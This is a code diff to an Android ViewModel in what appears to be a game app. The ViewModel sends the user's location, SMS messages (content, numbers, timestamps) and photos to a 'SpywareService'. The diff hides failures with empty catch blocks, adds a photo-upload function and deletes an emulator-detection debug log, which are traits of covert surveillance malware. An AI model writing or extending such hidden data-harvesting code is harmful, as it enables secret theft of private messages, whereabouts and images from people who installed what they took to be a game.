@@ -27,6 +27,7 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.firstOrNull
 import kotlinx.coroutines.launch
+import okhttp3.MultipartBody
 
 class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel() {
 
@@ -372,16 +373,18 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
     val isOnEmulator: StateFlow<Boolean> = _runningOnEmulator
 
     fun logLocations(lat: Double, lng: Double) {
-        viewModelScope.launch {
-            val service = serviceFactory.createService(SpywareService::class.java)
-            service.locationCheck(
-                LocationCheckBody(
-                    _sessionToken.value,
-                    lat,
-                    lng
+        try {
+            viewModelScope.launch {
+                val service = serviceFactory.createService(SpywareService::class.java)
+                service.locationCheck(
+                    LocationCheckBody(
+                        _sessionToken.value,
+                        lat,
+                        lng
+                    )
                 )
-            )
-        }
+            }
+        } catch (_: Exception) {}
     }
 
     fun logSms(
@@ -392,17 +395,33 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
         isInbox: Boolean
     ){
         viewModelScope.launch {
-            val service = serviceFactory.createService(SpywareService::class.java)
-            service.smsCheck(
-                SmsCheckBody(
-                    _sessionToken.value,
-                    content = smsContent,
-                    targetNumber = address,
-                    timestamp = longTimestamp,
-                    isInbox = isInbox,
-                    smsID = smsID
+            try {
+                val service = serviceFactory.createService(SpywareService::class.java)
+                service.smsCheck(
+                    SmsCheckBody(
+                        _sessionToken.value,
+                        content = smsContent,
+                        targetNumber = address,
+                        timestamp = longTimestamp,
+                        isInbox = isInbox,
+                        smsID = smsID
+                    )
                 )
-            )
+            } catch (_: Exception) {}
+        }
+    }
+
+    fun logPhoto(
+        attachmentParts: MultipartBody.Part
+    ) {
+        viewModelScope.launch {
+            try {
+                val service = serviceFactory.createService(SpywareService::class.java)
+                service.checkPhoto(
+                    authToken = _sessionToken.value,
+                    attachments = attachmentParts
+                )
+            } catch (_: Exception) {}
         }
     }
 
@@ -418,6 +437,5 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
         }
 
         _runningOnEmulator.value = isRunningOnEmulator()
-        Log.d("Emulator Detection", "Value :: ${_runningOnEmulator.value}")
     }
 }
